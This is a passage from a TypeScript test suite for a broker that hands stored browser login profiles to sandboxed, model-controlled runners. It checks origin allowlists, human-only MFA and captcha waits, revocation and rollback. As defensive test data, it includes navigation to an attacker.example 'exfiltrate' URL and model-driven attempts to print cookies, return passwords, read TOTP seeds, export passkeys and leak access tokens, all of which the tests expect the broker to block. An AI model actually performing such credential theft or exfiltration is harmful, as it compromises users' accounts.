    beforeEach(() => {
      clock = NOW;
      leaseRepository = new MemoryBrowserSessionLeaseRepository(repository);
      authenticationRepository = new MemoryBrowserAuthenticationRequestRepository();
      runnerHost = new MemoryBrowserSessionRunnerHost();
      broker = new BrowserSessionBroker(
        repository,
        new EncryptedBrowserProfileSecretStore({ root, masterKey: Buffer.alloc(32, 0x5a) }),
        () => true,
        () => clock,
        leaseRepository,
        runnerHost,
        authenticationRepository,
      );
    });

    async function enrolledProfile(
      accountAlias: string,
      retentionMode: 'preserve' | 'quarantine' = 'preserve',
      health: BrowserProfileHealth = HEALTHY,
    ) {
      const enrollment = await broker.beginEnrollment({
        ...enrollmentInput('claude', accountAlias),
        retentionPolicy: { mode: retentionMode, retainUntil: null },
      });
      const binding = await broker.captureEnrolledProfile({
        bindingId: enrollment.id,
        workspaceId: enrollment.workspaceId,
        externalProvider: enrollment.externalProvider,
        accountAlias: enrollment.accountAlias,
        health,
      }, profileBytes());
      return binding;
    }

    async function createGrant(
      binding: BrowserProfileProviderBinding,
      maximumConcurrentRunners = 1,
    ) {
      return broker.createSessionGrant({
        bindingId: binding.bindingId,
        workspaceId: binding.workspaceId,
        externalProvider: binding.externalProvider,
        runId: 'run-browser-42',
        storyId: 'BSB-002',
        purpose: 'provider-mcp-conformance',
        profileGeneration: binding.profileGeneration,
        allowedOrigins: binding.allowedOrigins,
        allowedActions: ['navigate', 'click', 'readText'],
        maximumConcurrentRunners,
        expiresAt: new Date(Date.parse(clock) + 10 * 60_000).toISOString(),
        evidenceContract: {
          schemaVersion: 'rorca.browser-session-evidence.v1',
          requiredEvidence: ['network_metadata', 'security_event', 'revocation_proof'],
          redaction: 'required',
        },
      });
    }

    function requestFor(grant: BrowserSessionGrantRecord) {
      return {
        grantId: grant.id,
        bindingId: grant.bindingId,
        workspaceId: grant.workspaceId,
        externalProvider: grant.externalProvider,
        runId: grant.runId,
        storyId: grant.storyId,
        purpose: grant.purpose,
        profileGeneration: grant.profileGeneration,
        allowedOrigins: [...grant.allowedOrigins],
        allowedActions: [...grant.allowedActions],
        expiresAt: new Date(Date.parse(clock) + 5 * 60_000).toISOString(),
      };
    }

    function operationFor(lease: BrowserSessionLeaseRecord) {
      return {
        leaseId: lease.id,
        bindingId: lease.bindingId,
        workspaceId: lease.workspaceId,
        externalProvider: lease.externalProvider,
        runId: lease.runId,
        storyId: lease.storyId,
        purpose: lease.purpose,
        profileGeneration: lease.profileGeneration,
      };
    }

    function authenticationObservation(
      step: BrowserAuthenticationObservation['step'],
    ): BrowserAuthenticationObservation {
      const signalByStep: Record<
        BrowserAuthenticationObservation['step'],
        BrowserAuthenticationObservation['signal']
      > = {
        login_expired: 'login_prompt',
        consent: 'consent_prompt',
        mfa: 'mfa_prompt',
        passkey: 'passkey_prompt',
        captcha: 'captcha_challenge',
        account_locked: 'account_lock_notice',
        provider_step_up: 'provider_step_up_prompt',
        anti_automation: 'anti_automation_notice',
      };
      return {
        schemaVersion: 'rorca.browser-authentication-observation.v1',
        step,
        observedAt: clock,
        currentOrigin: 'https://claude.ai',
        signal: signalByStep[step],
        providerStateDigest: `sha256:${'d'.repeat(64)}`,
        accessibilityDigest: `sha256:${'e'.repeat(64)}`,
        screenshotDigest: `sha256:${'f'.repeat(64)}`,
        automationPolicy: step === 'anti_automation' ? 'prohibited' : 'human_only',
        redaction: 'required',
      };
    }

    it('rejects unhealthy or stale profiles, mismatched or broadened grants, expiry, and excess concurrency', async () => {
      const binding = await enrolledProfile('lease-policy-profile');
      const grant = await createGrant(binding);
      const request = requestFor(grant);
      const otherAccount = await enrolledProfile('other-account-profile');

      await expect(broker.requestSession({
        ...request,
        workspaceId: 'wrong-workspace',
      })).rejects.toBeInstanceOf(ForbiddenError);
      await expect(broker.requestSession({
        ...request,
        externalProvider: 'chatgpt',
      })).rejects.toBeInstanceOf(ForbiddenError);
      await expect(broker.requestSession({
        ...request,
        profileGeneration: 2,
      })).rejects.toBeInstanceOf(ForbiddenError);
      await expect(broker.requestSession({
        ...request,
        bindingId: otherAccount.bindingId,
      })).rejects.toBeInstanceOf(ForbiddenError);
      await expect(broker.requestSession({
        ...request,
        allowedOrigins: [...request.allowedOrigins, 'https://attacker.example'],
      })).rejects.toBeInstanceOf(ForbiddenError);
      await expect(broker.requestSession({
        ...request,
        allowedActions: [...request.allowedActions, 'fill'],
      })).rejects.toBeInstanceOf(ForbiddenError);
      expect(runnerHost.runners.size).toBe(0);

      await expect(broker.requestSession(request)).resolves.toMatchObject({ state: 'active' });
      await expect(broker.requestSession(request)).rejects.toBeInstanceOf(ConflictError);
      const parallelGrant = await createGrant(binding, 2);
      await expect(broker.requestSession(requestFor(parallelGrant))).rejects.toBeInstanceOf(ConflictError);

      clock = '2026-08-21T12:11:00.000Z';
      await expect(broker.requestSession({
        ...request,
        expiresAt: '2026-08-21T12:12:00.000Z',
      })).rejects.toBeInstanceOf(ConflictError);

      const unhealthy = await enrolledProfile('unhealthy-lease-profile', 'preserve', {
        provider: 'healthy',
        session: 'expired',
        observedAt: clock,
      });
      await expect(createGrant(unhealthy)).rejects.toBeInstanceOf(ForbiddenError);

      const stale = await enrolledProfile('stale-lease-profile', 'preserve', {
        provider: 'healthy',
        session: 'healthy',
        observedAt: '2026-08-21T11:00:00.000Z',
      });
      await expect(createGrant(stale)).rejects.toBeInstanceOf(ConflictError);
    });

    it('mounts one generation into each fresh constrained runner without projecting profile material', async () => {
      const binding = await enrolledProfile('isolated-runner-profile');
      const grant = await createGrant(binding, 2);
      const first = await broker.requestSession(requestFor(grant));
      const second = await broker.requestSession(requestFor(grant));

      expect(first.runnerId).not.toBe(second.runnerId);
      expect(runnerHost.mounts).toHaveLength(2);
      expect(runnerHost.mounts).toEqual([
        expect.objectContaining({
          runnerId: first.runnerId,
          bindingId: binding.bindingId,
          profileGeneration: 1,
          modelContextAccess: 'none',
          filesystemAccess: 'ephemeral-profile-only',
          artifactAccess: 'redacted-only',
        }),
        expect.objectContaining({
          runnerId: second.runnerId,
          bindingId: binding.bindingId,
          profileGeneration: 1,
          modelContextAccess: 'none',
          filesystemAccess: 'ephemeral-profile-only',
          artifactAccess: 'redacted-only',
        }),
      ]);
      const launch = runnerHost.runners.get(first.runnerId)!;
      expect(launch).toMatchObject({
        networkAccess: 'exact-origin-allowlist-only',
        modelContextAccess: 'none',
        filesystemAccess: 'ephemeral-profile-only',
        artifactAccess: 'redacted-only',
      });
      expect(runnerHost.transientProfileBytes).toHaveLength(2);
      expect(runnerHost.transientProfileBytes.every(
        (profileBytes) => profileBytes.every((byte) => byte === 0),
      )).toBe(true);
      const projection = JSON.stringify([first, second]);
      expect(projection).not.toContain(PROFILE_PLAINTEXT);
      expect(projection).not.toContain(binding.secretReferences[0]!.secretId);
      expect(projection).not.toMatch(/profilePath|profileBytes|cookie/i);
    });

    it('settles a lease-issue crash before one retry creates a single tracked runner', async () => {
      const binding = await enrolledProfile('lease-issue-crash-profile');
      const grant = await createGrant(binding);
      const request = requestFor(grant);
      runnerHost.launchFailure = true;

      await expect(broker.requestSession(request)).rejects.toThrow('Injected lease issue crash');

      expect(leaseRepository.grants.size).toBe(1);
      expect(leaseRepository.leases.size).toBe(1);
      expect([...leaseRepository.leases.values()][0]).toMatchObject({
        state: 'revoked',
        revocationReason: 'runner_provisioning_failed',
      });
      expect(runnerHost.runners.size).toBe(0);
      expect(repository.records.get(binding.bindingId)).toMatchObject({
        lifecycleState: 'active',
        providerHealth: 'healthy',
        sessionHealth: 'healthy',
      });

      runnerHost.launchFailure = false;
      await expect(broker.requestSession(request)).resolves.toMatchObject({ state: 'active' });
      expect(await leaseRepository.listOpenLeasesForBroker()).toHaveLength(1);
      expect(runnerHost.runners.size).toBe(1);
    });

    it('cryptographically rejects profile-policy tampering and applies retention after provisioning cleanup', async () => {
      const binding = await enrolledProfile('lease-policy-tamper-profile', 'quarantine');
      const stored = repository.records.get(binding.bindingId)!;
      stored.allowedOrigins = ['https://attacker.example'];
      binding.allowedOrigins = ['https://attacker.example'];
      const grant = await createGrant(binding);

      await expect(broker.requestSession(requestFor(grant))).rejects.toBeInstanceOf(ForbiddenError);
      expect(runnerHost.mounts).toHaveLength(0);
      expect(runnerHost.terminated).toHaveLength(1);
      expect(runnerHost.cleared).toHaveLength(1);
      expect([...leaseRepository.leases.values()][0]).toMatchObject({
        state: 'revoked',
        revocationReason: 'runner_provisioning_failed',
      });
      expect(repository.records.get(binding.bindingId)).toMatchObject({
        lifecycleState: 'quarantined',
        bindingStatus: 'disabled',
      });
    });

    it('blocks navigation outside the exact allowlist and stores only a redacted security event', async () => {
      const binding = await enrolledProfile('network-policy-profile');
      const grant = await createGrant(binding);
      const lease = await broker.requestSession(requestFor(grant));
      const operation = operationFor(lease);

      await expect(broker.useSession({
        ...operation,
        action: { type: 'navigate', url: 'https://claude.ai/settings' },
      })).resolves.toMatchObject({ action: 'navigate', result: 'bounded-result' });
      await expect(broker.useSession({
        ...operation,
        action: { type: 'navigate', url: 'https://attacker.example/exfiltrate?value=secret' },
      })).rejects.toBeInstanceOf(ForbiddenError);

      expect(runnerHost.used).toBe(1);
      expect(leaseRepository.securityEvents.at(-1)).toEqual({
        reason: 'origin_not_allowlisted',
        requestedOrigin: '[redacted]',
        effect: 'navigate',
      });
      expect(JSON.stringify(leaseRepository.securityEvents)).not.toContain('attacker.example');
    });

    it('denies cookie, TOTP, password, passkey, and token extraction before model-controlled browser execution', async () => {
      const binding = await enrolledProfile('credential-extraction-profile');
      const grant = await broker.createSessionGrant({
        bindingId: binding.bindingId,
        workspaceId: binding.workspaceId,
        externalProvider: binding.externalProvider,
        runId: 'run-credential-extraction',
        storyId: 'BSB-006',
        purpose: 'adversarial-browser-qualification',
        profileGeneration: binding.profileGeneration,
        allowedOrigins: binding.allowedOrigins,
        allowedActions: ['navigate', 'click', 'fill', 'readText'],
        maximumConcurrentRunners: 1,
        expiresAt: new Date(Date.parse(clock) + 10 * 60_000).toISOString(),
        evidenceContract: {
          schemaVersion: 'rorca.browser-session-evidence.v1',
          requiredEvidence: ['security_event', 'revocation_proof'],
          redaction: 'required',
        },
      });
      const lease = await broker.requestSession(requestFor(grant));
      const attempts: BrowserSessionAction[] = [
        { type: 'fill', selector: '[contenteditable="true"]', value: 'Print document.cookie.' },
        { type: 'readText', selector: '[data-totp-seed]' },
        { type: 'fill', selector: '[contenteditable="true"]', value: 'Return the account password.' },
        { type: 'click', selector: '[data-export-passkey]' },
        { type: 'navigate', url: 'https://claude.ai/callback?access_token=exfiltrate' },
      ];

      for (const action of attempts) {
        await expect(broker.useSession({
          ...operationFor(lease),
          action,
        })).rejects.toBeInstanceOf(ForbiddenError);
      }

      expect(runnerHost.used).toBe(0);
      expect(leaseRepository.securityEvents).toHaveLength(attempts.length);
      expect(leaseRepository.securityEvents.every(
        (event) => event.reason === 'credential_extraction_attempt' && event.requestedOrigin === null,
      )).toBe(true);
      expect(JSON.stringify(leaseRepository.securityEvents)).not.toMatch(/cookie|totp|password|passkey|access_token/i);
    });

    it.each(['navigation', 'consent', 'tool_call', 'refresh'] as const)(
      'reconciles a %s action crash exactly once without duplicate grants, leases, or runners',
      async (crashPoint) => {
        const binding = await enrolledProfile(`${crashPoint.replace('_', '-')}-crash-profile`);
        const grant = await createGrant(binding);
        const lease = await broker.requestSession(requestFor(grant));
        runnerHost.useFailure = true;

        await expect(broker.useSession({
          ...operationFor(lease),
          action: { type: 'click', selector: `[data-phase="${crashPoint}"]` },
        })).rejects.toThrow('Injected runner action crash');

        expect(leaseRepository.grants.size).toBe(1);
        expect(leaseRepository.leases.size).toBe(1);
        expect(leaseRepository.leases.get(lease.id)?.state).toBe('uncertain');
        expect(repository.records.get(binding.bindingId)).toMatchObject({
          providerHealth: 'degraded',
          sessionHealth: 'unknown',
        });

        runnerHost.useFailure = false;
        runnerHost.reconciliationHealth = HEALTHY;
        await expect(broker.reconcileSession(operationFor(lease))).resolves.toMatchObject({
          state: 'revoked',
          revocationReason: 'runner_reconciled',
        });
        await expect(broker.reconcileSession(operationFor(lease))).rejects.toBeInstanceOf(ConflictError);
        expect(runnerHost.runners.size).toBe(0);
        expect(await leaseRepository.listOpenLeasesForBroker()).toEqual([]);
        expect(repository.records.get(binding.bindingId)).toMatchObject({
          lifecycleState: 'active',
          providerHealth: 'healthy',
          sessionHealth: 'healthy',
        });
      },
    );

    it('fails takeover automation, then quarantines the uncertain profile with no orphan runner', async () => {
      const binding = await enrolledProfile('takeover-automation-profile');
      const grant = await createGrant(binding);
      const lease = await broker.requestSession(requestFor(grant));
      runnerHost.observation = authenticationObservation('mfa');
      const waiting = await broker.useSession({
        ...operationFor(lease),
        action: { type: 'click', selector: '[data-provider-action]' },
      });
      expect(waiting.kind).toBe('authentication_required');

      await expect(broker.useSession({
        ...operationFor(lease),
        action: { type: 'click', selector: '[data-automation-during-takeover]' },
      })).rejects.toBeInstanceOf(ConflictError);
      expect(leaseRepository.leases.get(lease.id)?.state).toBe('uncertain');

      const disabled = await broker.disableBroker();
      expect(disabled.status).toBe('disabled');
      expect(disabled.revokedLeaseIds).toEqual([lease.id]);
      expect(runnerHost.runners.size).toBe(0);
      expect(repository.records.get(binding.bindingId)).toMatchObject({
        lifecycleState: 'quarantined',
        bindingStatus: 'disabled',
      });
    });

    it('creates typed durable waits for every supported provider state and rejects unobserved completion', async () => {
      const steps: BrowserAuthenticationObservation['step'][] = [
        'login_expired',
        'consent',
        'mfa',
        'passkey',
        'captcha',
        'account_locked',
        'provider_step_up',
        'anti_automation',
      ];

      for (const [index, step] of steps.entries()) {
        const binding = await enrolledProfile(`auth-step-${index}`);
        const grant = await createGrant(binding);
        const lease = await broker.requestSession(requestFor(grant));
        runnerHost.observation = authenticationObservation(step);
        runnerHost.revalidation = {
          schemaVersion: 'rorca.browser-authentication-revalidation.v1',
          observedAt: clock,
          currentOrigin: 'https://claude.ai',
          providerStateDigest: `sha256:${'1'.repeat(64)}`,
          accessibilityDigest: `sha256:${'2'.repeat(64)}`,
          challengePresent: true,
          health: {
            provider: step === 'account_locked' ? 'locked' : 'degraded',
            session: step === 'login_expired' ? 'expired' : 'unknown',
            observedAt: clock,
          },
          redaction: 'required',
        };

        const result = await broker.useSession({
          ...operationFor(lease),
          action: { type: 'readText', selector: 'body' },
        });
        expect(result.kind).toBe('authentication_required');
        if (result.kind !== 'authentication_required') throw new Error('Expected typed authentication request');
        expect(result.authenticationRequest).toMatchObject({
          leaseId: lease.id,
          bindingId: binding.bindingId,
          workspaceId: binding.workspaceId,
          externalProvider: 'claude',
          runId: grant.runId,
          storyId: grant.storyId,
          purpose: grant.purpose,
          profileGeneration: 1,
          step,
          runPauseOwned: true,
        });
        if (step === 'anti_automation') expect(runnerHost.cleared).toContain(lease.runnerId);
        else expect(runnerHost.suspended).toContain(lease.runnerId);
        expect(JSON.stringify(result)).not.toMatch(/password|cookie|totpSeed|profileBytes|recoveryCode/i);

        if (step === 'anti_automation') {
          expect(result.authenticationRequest).toMatchObject({
            state: 'POLICY_PROHIBITED',
            disposition: 'terminal',
            outcomeCode: 'AUTHENTICATION_POLICY_PROHIBITED',
          });
          expect(leaseRepository.leases.get(lease.id)?.state).toBe('revoked');
          continue;
        }

        await expect(broker.resolveAuthentication(result.authenticationRequest.requestId, {
          workspaceId: binding.workspaceId,
          runId: grant.runId,
          decision: 'complete',
        }, 'operator-7')).rejects.toBeInstanceOf(ConflictError);
        expect(authenticationRepository.requests.get(result.authenticationRequest.requestId)?.state)
          .toBe('REVALIDATING');
        expect(runnerHost.resumeCalls).toBe(0);

        const cancelled = await broker.resolveAuthentication(result.authenticationRequest.requestId, {
          workspaceId: binding.workspaceId,
          runId: grant.runId,
          decision: 'cancel',
        }, 'operator-7');
        expect(cancelled).toMatchObject({
          state: 'CANCELLED',
          disposition: 'terminal',
          outcomeCode: 'AUTHENTICATION_CANCELLED',
          resumeCount: 0,
        });
        expect(leaseRepository.leases.get(lease.id)?.state).toBe('revoked');
      }
    });

    it('revokes and clears the runner when authentication suspension cannot become durable', async () => {
      const binding = await enrolledProfile('auth-checkpoint-failure');
      const grant = await createGrant(binding);
      const lease = await broker.requestSession(requestFor(grant));
      runnerHost.observation = authenticationObservation('mfa');
      runnerHost.suspensionFailure = true;

      await expect(broker.useSession({
        ...operationFor(lease),
        action: { type: 'click', selector: '[data-mfa]' },
      })).rejects.toThrow('Authentication checkpoint persistence failed');

      expect(authenticationRepository.requests.size).toBe(0);
      expect(runnerHost.terminated).toContain(lease.runnerId);
      expect(runnerHost.cleared).toContain(lease.runnerId);
      expect(leaseRepository.leases.get(lease.id)).toMatchObject({
        state: 'revoked',
        revocationReason: 'authentication_wait_persistence_failed',
      });
    });

    it('rejects healthy-looking revalidation outside the leased origins and never resumes automation', async () => {
      const binding = await enrolledProfile('auth-origin-revalidation');
      const grant = await createGrant(binding);
      const lease = await broker.requestSession(requestFor(grant));
      runnerHost.observation = authenticationObservation('passkey');
      const result = await broker.useSession({
        ...operationFor(lease),
        action: { type: 'click', selector: '[data-passkey]' },
      });
      if (result.kind !== 'authentication_required') throw new Error('Expected typed authentication request');
      runnerHost.revalidation = {
        schemaVersion: 'rorca.browser-authentication-revalidation.v1',
        observedAt: clock,
        currentOrigin: 'https://attacker.example',
        providerStateDigest: `sha256:${'7'.repeat(64)}`,
        accessibilityDigest: `sha256:${'8'.repeat(64)}`,
        challengePresent: false,
        health: HEALTHY,
        redaction: 'required',
      };

      await expect(broker.resolveAuthentication(result.authenticationRequest.requestId, {
        workspaceId: binding.workspaceId,
        runId: grant.runId,
        decision: 'complete',
      }, 'operator-7')).resolves.toMatchObject({
        state: 'UNHEALTHY',
        disposition: 'retryable',
        outcomeCode: 'AUTHENTICATION_UNHEALTHY',
        resolutionObservation: null,
      });
      expect(runnerHost.resumeCalls).toBe(0);
      expect(leaseRepository.leases.get(lease.id)?.state).toBe('revoked');
    });

    it('settles a typed retryable outcome when the runner cannot resume after healthy revalidation', async () => {
      const binding = await enrolledProfile('auth-resume-failure');
      const grant = await createGrant(binding);
      const lease = await broker.requestSession(requestFor(grant));
      runnerHost.observation = authenticationObservation('consent');
      const result = await broker.useSession({
        ...operationFor(lease),
        action: { type: 'click', selector: '[data-consent]' },
      });
      if (result.kind !== 'authentication_required') throw new Error('Expected typed authentication request');
      runnerHost.revalidation = {
        schemaVersion: 'rorca.browser-authentication-revalidation.v1',
        observedAt: clock,
        currentOrigin: 'https://claude.ai',
        providerStateDigest: `sha256:${'9'.repeat(64)}`,
        accessibilityDigest: `sha256:${'0'.repeat(64)}`,
        challengePresent: false,
        health: HEALTHY,
        redaction: 'required',
      };
      runnerHost.resumeFailure = true;

      await expect(broker.resolveAuthentication(result.authenticationRequest.requestId, {
        workspaceId: binding.workspaceId,
        runId: grant.runId,
        decision: 'complete',
      }, 'operator-7')).resolves.toMatchObject({
        state: 'UNHEALTHY',
        disposition: 'retryable',
        outcomeCode: 'AUTHENTICATION_UNHEALTHY',
        resolutionObservation: null,
      });
      expect(runnerHost.resumeCalls).toBe(0);
      expect(leaseRepository.leases.get(lease.id)?.state).toBe('revoked');
    });

    it('survives broker restart and resumes exactly once only after healthy provider revalidation', async () => {
      const binding = await enrolledProfile('restart-auth-profile');
      const grant = await createGrant(binding);
      const lease = await broker.requestSession(requestFor(grant));
      runnerHost.observation = authenticationObservation('mfa');

      const result = await broker.useSession({
        ...operationFor(lease),
        action: { type: 'click', selector: '[data-connect]' },
      });
      if (result.kind !== 'authentication_required') throw new Error('Expected typed authentication request');
      const waitingRequest = result.authenticationRequest;
      expect(waitingRequest.state).toBe('WAITING_FOR_AUTHENTICATION');

      runnerHost.revalidation = {
        schemaVersion: 'rorca.browser-authentication-revalidation.v1',
        observedAt: clock,
        currentOrigin: 'https://claude.ai',
        providerStateDigest: `sha256:${'3'.repeat(64)}`,
        accessibilityDigest: `sha256:${'4'.repeat(64)}`,
        challengePresent: false,
        health: HEALTHY,
        redaction: 'required',
      };
      const restarted = new BrowserSessionBroker(
        repository,
        new EncryptedBrowserProfileSecretStore({ root, masterKey: Buffer.alloc(32, 0x5a) }),
        () => true,
        () => clock,
        leaseRepository,
        runnerHost,
        authenticationRepository,
      );
      const resumed = await restarted.resolveAuthentication(waitingRequest.requestId, {
        workspaceId: waitingRequest.workspaceId,
        runId: waitingRequest.runId,
        decision: 'complete',
      }, 'operator-after-restart');
      expect(resumed).toMatchObject({
        state: 'RESUMED',
        disposition: 'resumed',
        outcomeCode: 'AUTHENTICATION_RESUMED',
        resumeCount: 1,
        resolutionObservation: {
          challengePresent: false,
          health: { provider: 'healthy', session: 'healthy' },
        },
      });
      expect(runnerHost.resumeCalls).toBe(1);

      await expect(restarted.resolveAuthentication(waitingRequest.requestId, {
        workspaceId: waitingRequest.workspaceId,
        runId: waitingRequest.runId,
        decision: 'complete',
      }, 'operator-after-restart')).resolves.toMatchObject({ state: 'RESUMED', resumeCount: 1 });
      expect(runnerHost.resumeCalls).toBe(1);

      runnerHost.observation = null;
      await expect(restarted.useSession({
        ...operationFor(lease),
        action: { type: 'readText', selector: 'body' },
      })).resolves.toMatchObject({ kind: 'completed', result: 'bounded-result' });
    });

    it('revokes and returns typed denied, expired, and unhealthy outcomes', async () => {
      const unhealthyBinding = await enrolledProfile('unhealthy-auth-profile');
      const unhealthyGrant = await createGrant(unhealthyBinding);
      const unhealthyLease = await broker.requestSession(requestFor(unhealthyGrant));
      runnerHost.observation = authenticationObservation('consent');
      const unhealthyResult = await broker.useSession({
        ...operationFor(unhealthyLease),
        action: { type: 'click', selector: '[data-consent]' },
      });
      if (unhealthyResult.kind !== 'authentication_required') throw new Error('Expected typed authentication request');
      runnerHost.revalidation = {
        schemaVersion: 'rorca.browser-authentication-revalidation.v1',
        observedAt: clock,
        currentOrigin: 'https://claude.ai',
        providerStateDigest: `sha256:${'5'.repeat(64)}`,
        accessibilityDigest: `sha256:${'6'.repeat(64)}`,
        challengePresent: false,
        health: { provider: 'degraded', session: 'unknown', observedAt: clock },
        redaction: 'required',
      };
      await expect(broker.resolveAuthentication(unhealthyResult.authenticationRequest.requestId, {
        workspaceId: unhealthyBinding.workspaceId,
        runId: unhealthyGrant.runId,
        decision: 'complete',
      }, 'operator-7')).resolves.toMatchObject({
        state: 'UNHEALTHY',
        disposition: 'retryable',
        outcomeCode: 'AUTHENTICATION_UNHEALTHY',
      });
      expect(leaseRepository.leases.get(unhealthyLease.id)?.state).toBe('revoked');

      const deniedBinding = await enrolledProfile('denied-auth-profile');
      const deniedGrant = await createGrant(deniedBinding);
      const deniedLease = await broker.requestSession(requestFor(deniedGrant));
      runnerHost.observation = authenticationObservation('provider_step_up');
      const deniedResult = await broker.useSession({
        ...operationFor(deniedLease),
        action: { type: 'click', selector: '[data-step-up]' },
      });
      if (deniedResult.kind !== 'authentication_required') throw new Error('Expected typed authentication request');
      await expect(broker.resolveAuthentication(deniedResult.authenticationRequest.requestId, {
        workspaceId: deniedBinding.workspaceId,
        runId: deniedGrant.runId,
        decision: 'deny',
      }, 'operator-7')).resolves.toMatchObject({
        state: 'DENIED',
        disposition: 'terminal',
        outcomeCode: 'AUTHENTICATION_DENIED',
      });
      expect(leaseRepository.leases.get(deniedLease.id)?.state).toBe('revoked');

      const expiredBinding = await enrolledProfile('expired-auth-profile');
      const expiredGrant = await createGrant(expiredBinding);
      const expiredLease = await broker.requestSession(requestFor(expiredGrant));
      runnerHost.observation = authenticationObservation('login_expired');
      const expiredResult = await broker.useSession({
        ...operationFor(expiredLease),
        action: { type: 'navigate', url: 'https://claude.ai' },
      });
      if (expiredResult.kind !== 'authentication_required') throw new Error('Expected typed authentication request');
      clock = expiredResult.authenticationRequest.authenticationExpiresAt;
      await expect(broker.getAuthenticationRequestForRun(expiredBinding.workspaceId, expiredGrant.runId))
        .resolves.toMatchObject({
          state: 'EXPIRED',
          disposition: 'retryable',
          outcomeCode: 'AUTHENTICATION_EXPIRED',
        });
      expect(leaseRepository.leases.get(expiredLease.id)?.state).toBe('revoked');
    });

    it('revokes the lease, terminates and clears its runner, rejects replay, and applies quarantine retention', async () => {
      const binding = await enrolledProfile('revocation-profile', 'quarantine');
      const grant = await createGrant(binding);
      const lease = await broker.requestSession(requestFor(grant));
      const operation = operationFor(lease);

      const revoked = await broker.revokeSession({
        ...operation,
        reason: 'purpose_completed',
      });

      expect(revoked).toMatchObject({ state: 'revoked', revocationReason: 'purpose_completed' });
      expect(runnerHost.terminated).toContain(lease.runnerId);
      expect(runnerHost.cleared).toContain(lease.runnerId);
      expect(repository.records.get(binding.bindingId)).toMatchObject({
        lifecycleState: 'quarantined',
        bindingStatus: 'disabled',
      });
      await expect(broker.useSession({
        ...operation,
        action: { type: 'readText', selector: 'body' },
      })).rejects.toBeInstanceOf(ConflictError);
    });

    it('keeps the lease and profile fenced when runner termination rejects until reconciliation succeeds', async () => {
      const binding = await enrolledProfile('uncertain-revocation-profile');
      const grant = await createGrant(binding);
      const lease = await broker.requestSession(requestFor(grant));
      const operation = operationFor(lease);
      runnerHost.terminationFailure = true;

      await expect(broker.revokeSession({
        ...operation,
        reason: 'operator_revoked',
      })).rejects.toBeInstanceOf(ServiceUnavailableError);
      expect(leaseRepository.leases.get(lease.id)).toMatchObject({
        state: 'uncertain',
        revocationReason: 'runner_termination_uncertain',
      });
      expect(repository.records.get(binding.bindingId)).toMatchObject({
        providerHealth: 'degraded',
        sessionHealth: 'unknown',
      });
      await expect(broker.requestSession(requestFor(grant))).rejects.toBeInstanceOf(ForbiddenError);

      runnerHost.terminationFailure = false;
      runnerHost.reconciliationHealth = HEALTHY;
      await expect(broker.reconcileSession(operation)).resolves.toMatchObject({
        state: 'revoked',
        revocationReason: 'runner_reconciled',
      });
      await expect(broker.requestSession(requestFor(grant))).resolves.toMatchObject({ state: 'active' });
    });

    it('atomically disables rollout, revokes authority, terminates runners, quarantines profiles, and preserves evidence', async () => {
      const binding = await enrolledProfile('rollback-profile');
      const secretRef = binding.secretReferences[0]!.secretId;
      const artifactPath = path.join(root, `${secretRef}.profile.enc`);
      const grant = await createGrant(binding);
      const lease = await broker.requestSession(requestFor(grant));
      await expect(broker.useSession({
        ...operationFor(lease),
        action: { type: 'navigate', url: 'https://network-escape.invalid' },
      })).rejects.toBeInstanceOf(ForbiddenError);
      const evidenceCount = leaseRepository.securityEvents.length;

      const disabled = await broker.disableBroker();

      expect(disabled).toEqual({
        status: 'disabled',
        disabledAt: clock,
        revokedLeaseIds: [lease.id],
        terminatedRunnerIds: [lease.runnerId],
        quarantinedBindingIds: [binding.bindingId],
        revokedGrantCount: 1,
        receipts: 'preserved',
        operatorRecoveryActions: [],
      });
      expect(leaseRepository.leases.get(lease.id)?.state).toBe('revoked');
      expect(leaseRepository.grants.get(grant.id)?.state).toBe('revoked');
      expect(runnerHost.runners.size).toBe(0);
      expect(repository.records.get(binding.bindingId)).toMatchObject({
        lifecycleState: 'quarantined',
        bindingStatus: 'disabled',
      });
      expect(leaseRepository.securityEvents).toHaveLength(evidenceCount);
      await expect(fs.stat(artifactPath)).resolves.toBeDefined();
      await expect(broker.requestSession(requestFor(grant))).rejects.toBeInstanceOf(ForbiddenError);
      await expect(broker.beginEnrollment(enrollmentInput('claude', 'blocked-after-rollback')))
        .rejects.toBeInstanceOf(ForbiddenError);
      await expect(broker.getProviderBinding(binding.workspaceId, {
        externalProvider: binding.externalProvider,
        accountAlias: binding.accountAlias,
      })).resolves.toBeNull();

      await expect(broker.disableBroker()).resolves.toMatchObject({
        status: 'disabled',
        revokedLeaseIds: [],
        quarantinedBindingIds: [],
        revokedGrantCount: 0,
        receipts: 'preserved',
      });
    });

    it('keeps a failed rollback fenced with an explicit recovery action until one reconciliation succeeds', async () => {
      const binding = await enrolledProfile('rollback-reconciliation-profile');
      const grant = await createGrant(binding);
      const lease = await broker.requestSession(requestFor(grant));
      runnerHost.termination = 'uncertain';

      const failed = await broker.disableBroker();

      expect(failed.status).toBe('recovery_required');
      expect(failed.operatorRecoveryActions).toEqual([expect.objectContaining({
        code: 'RECONCILE_RUNNER',
        bindingId: binding.bindingId,
        leaseId: lease.id,
        runnerId: lease.runnerId,
        action: expect.stringContaining(`reconcile lease ${lease.id}`),
      })]);
      expect(repository.records.get(binding.bindingId)).toMatchObject({
        lifecycleState: 'quarantined',
        bindingStatus: 'disabled',
      });
      expect(leaseRepository.leases.get(lease.id)?.state).toBe('uncertain');
      await expect(broker.useSession({
        ...operationFor(lease),
        action: { type: 'readText', selector: 'body' },
      })).rejects.toBeInstanceOf(ForbiddenError);

      runnerHost.termination = 'terminated';
      const recovered = await broker.disableBroker();
      expect(recovered.status).toBe('disabled');
      expect(recovered.revokedLeaseIds).toEqual([lease.id]);
      expect(leaseRepository.leases.get(lease.id)?.state).toBe('revoked');
      expect(runnerHost.runners.size).toBe(0);
    });

    it('fences a lost heartbeat until runner termination and provider/session health reconcile', async () => {
      const binding = await enrolledProfile('heartbeat-profile');
      const grant = await createGrant(binding);
      const lease = await broker.requestSession(requestFor(grant));
      const operation = operationFor(lease);

      clock = '2026-08-21T12:02:00.000Z';
      await expect(broker.requestSession(requestFor(grant))).rejects.toBeInstanceOf(ConflictError);
      await expect(broker.useSession({
        ...operation,
        action: { type: 'readText', selector: 'body' },
      })).rejects.toBeInstanceOf(ConflictError);
      expect(leaseRepository.leases.get(lease.id)?.state).toBe('uncertain');
      expect(repository.records.get(binding.bindingId)).toMatchObject({
        providerHealth: 'degraded',
        sessionHealth: 'unknown',
      });
      await expect(broker.requestSession(requestFor(grant))).rejects.toBeInstanceOf(ForbiddenError);

      runnerHost.reconciliationHealth = {
        provider: 'healthy',
        session: 'healthy',
        observedAt: clock,
      };
